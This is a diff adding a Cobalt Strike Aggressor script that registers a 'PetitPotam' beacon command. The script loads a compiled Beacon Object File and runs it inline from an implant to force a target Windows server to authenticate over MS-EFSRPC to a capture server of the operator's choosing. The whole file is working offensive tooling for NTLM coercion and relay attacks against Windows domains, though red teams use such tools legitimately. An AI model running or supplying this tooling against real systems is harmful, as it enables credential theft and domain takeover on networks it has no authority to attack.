@@ -1,0 +1,41 @@
+#PetitPotam Bof
+#author Cornelis de Plaa, @b4rtik
+#@outflank.nl
+
+#BOF implementation of the PetitPotam exploit originally created by @topotam77
+#https://github.com/topotam/PetitPotam
+
+#register help
+beacon_command_register("PetitPotam", "Coerce Windows hosts to authenticate to other machines via MS-EFSRPC.",
+	"Synopsis: PetitPotam <capture server ip or hostname> <target server ip or hostname>\n\n" .
+	"Bof implementation of the PetitPotam exploit.\n");
+
+alias PetitPotam {
+    $bid = $1;
+
+    $input = substr($0, 11);
+    @args = split(' ', $input);
+
+    $captureserver = @args[0];
+    $target = @args[1];
+
+    if ($captureserver eq "") {
+      berror($bid, "Please specify a capture server.");
+		  return;
+    }
+
+    if ($target eq "") {
+		  berror($bid, "Please specify a target server.");
+		  return;
+    }
+    
+    # Read in the right BOF file
+    $handle = openf(script_resource("PetitPotam." . barch($bid) . ".o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "ZZ", $captureserver, $target);
+    
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
